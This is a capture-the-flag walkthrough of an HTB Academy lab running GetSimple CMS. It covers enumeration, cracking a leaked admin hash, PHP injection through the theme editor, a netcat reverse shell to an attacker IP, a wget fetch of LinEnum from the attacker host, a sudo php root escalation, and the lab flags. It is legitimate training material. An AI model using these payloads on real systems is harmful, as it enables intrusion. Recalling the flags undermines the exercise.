# Hack The Box - Knowledge Check Walkthrough

## Introduction
This walkthrough covers the **HTB Academy - Getting Started: Knowledge Check** module. The goal is to gain a foothold on the target machine, escalate privileges to root, and retrieve the respective flags.

## Target Information

| Detail                | Information                |
|----------------------|--------------------------|
| **IP Address**      | 10.129.152.174           |
| **Operating System** | Linux                    |
| **Web Server**       | Apache 2.4.41 (Ubuntu)   |
| **CMS**             | GetSimple CMS            |

---

## Enumeration
### **1. Scanning with Nmap**
Start by identifying open ports and services:
```bash
nmap -sC -sV -oA enum_scan 10.129.152.174 -v
```
#### **Key Findings:**
- **Port 22 (SSH)** - Open
- **Port 80 (HTTP)** - Open, running Apache 2.4.41
- **http-robots.txt** - Disallowed entry: `/admin`
- **Web Server Title:** `GetSimple CMS`

### **2. Web Enumeration**
Identify running web applications and hidden directories:
```bash
whatweb http://10.129.152.174/
```
#### **Findings:**
- **CMS Detected:** GetSimple CMS
- **robots.txt Identified:** Possible admin panel at `/admin`

Perform directory brute-forcing using **Gobuster**:
```bash
gobuster dir -u http://10.129.152.174/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
#### **Results:**
- **/admin/** (Admin panel)
- **/data/** (User-generated data storage)

---

## Exploitation
### **1. Finding Admin Credentials**
Inspecting `/data/users.xml`, we find:
```xml
<USR>admin</USR>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
```
Using **CrackStation** to crack the hash reveals the password: `admin`.

### **2. Gaining Admin Access**
Login to the **Admin Panel**:
```bash
curl -X POST -d "username=admin&password=admin" http://10.129.152.174/admin/index.php
```
**Successfully logged in!**

---

## Initial Foothold
### **1. Uploading a Web Shell**
Navigating to `/admin/upload.php`, we find file upload functionality but only for directories.

Attempting file upload via **cURL**:
```bash
curl -X POST -F "file=@shell.php" http://10.129.152.174/admin/upload.php
```
**Error: Upload blocked.**

### **2. Code Injection via Theme Editing**
Since upload is blocked, we exploit **theme customization**:
1. **Navigate to** `Admin Panel → Themes → Innovation → template.php`
2. **Insert PHP shell code:**
```php
<?php system('id'); ?>
```
3. **Save & Execute by visiting** `http://10.129.152.174/`

We confirm Remote Code Execution (RCE)!

### **3. Getting a Reverse Shell**
Modify **template.php** with:
```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> 9001 >/tmp/f"); ?>
```
Start a **Netcat Listener**:
```bash
nc -lvnp 9001
```
Visit the homepage to execute the shell.

We have **shell access as www-data**! 🎉

Upgrade to a fully interactive **TTY shell**:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo
fg
```

---

## Privilege Escalation
### **1. Running LinEnum for Enumeration**
Transfer **LinEnum.sh** to the target:
```bash
wget http://<ATTACKER-IP>:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```
#### **Findings:**
- **Sudo privilege for PHP execution:**
```bash
sudo /usr/bin/php -r 'system("/bin/sh");'
```

### **2. Gaining Root Access**
Execute the following command:
```bash
sudo /usr/bin/php -r 'system("/bin/bash");'
```
We are now **root**! 🚀

Retrieve **root.txt**:
```bash
cat /root/root.txt
```

---

## Conclusion
### **Key Takeaways**
✅ **Enumeration:** Identified CMS & Admin panel.
✅ **Exploitation:** Leveraged template file edit for RCE.
✅ **Foothold:** Obtained a reverse shell via Netcat.
✅ **Privilege Escalation:** Abused sudo permissions to gain root.

### **Final Flags:**
- **User Flag:** `7002d65b149b0a4d19132a66feed21d8`
- **Root Flag:** `f1fba6e9f71efb2630e6e34da6387842`

Hack the Box - **Mission Accomplished!** 🎯
